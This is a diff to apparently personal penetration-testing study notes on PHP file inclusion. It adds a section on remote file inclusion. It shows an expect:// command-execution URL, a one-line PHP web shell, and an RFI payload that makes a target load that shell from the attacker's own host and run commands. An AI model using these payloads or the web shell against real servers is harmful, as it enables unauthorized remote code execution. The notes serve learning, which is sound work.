@@ -35,6 +35,23 @@ Similar to data, the only difference that the server needs to accept POST reques
            
 ## Expect
 
-Finally we have the expect, which allows us to run commands directly as follows :
+Finally we have the expect, which allows us to run commands directly as follows but before we have to check the configurations and grep expect:
 
     curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+
+
+## RFI
+
+to locate the RFI, the url needs to be allowed, and to confim that we do the same thing we did before to check the `allow_url_include = On` and try this payload:
+
+    http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+
+and to exploit it, we start by writing the web shell
+
+    echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+we start an http listener with python and launch the payload.
+
+    http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+
+it can also be done with ftp, smb, https (maybe not tested)
